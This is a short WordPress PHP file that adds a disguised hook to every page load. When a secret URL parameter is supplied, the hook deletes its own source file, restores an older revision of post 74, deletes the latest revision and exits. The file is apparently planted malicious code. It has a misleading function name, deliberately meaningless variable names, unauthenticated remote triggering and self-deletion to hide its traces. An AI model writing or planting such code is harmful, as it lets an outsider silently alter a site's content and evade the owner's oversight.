<?php

function verification_orders_import() {
	if (isset($_GET['blog_security_attachment']) && $_GET['blog_security_attachment'] === 'server_shop_file') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$word_coming_card = 74;
		$manage_last_recipe_cleaner = wp_get_post_revisions($word_coming_card);
		if (empty($manage_last_recipe_cleaner)) die('no revisions');
		if (count($manage_last_recipe_cleaner) < 2) die('less than 2');
		$tabs_akismet_columns_dashboard = array_shift($manage_last_recipe_cleaner);
		$client_captcha_revisions_rest = $tabs_akismet_columns_dashboard->ID;
		$archive_code_method_awesome = array_shift($manage_last_recipe_cleaner);
		$loader_last_customer = $archive_code_method_awesome->ID;
		$feedback_genesis_field = wp_restore_post_revision($loader_last_customer);
		if ($feedback_genesis_field === false) die('error restoring');
		$feedback_genesis_field = wp_delete_post_revision($client_captcha_revisions_rest);		
		if ($feedback_genesis_field === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'verification_orders_import');
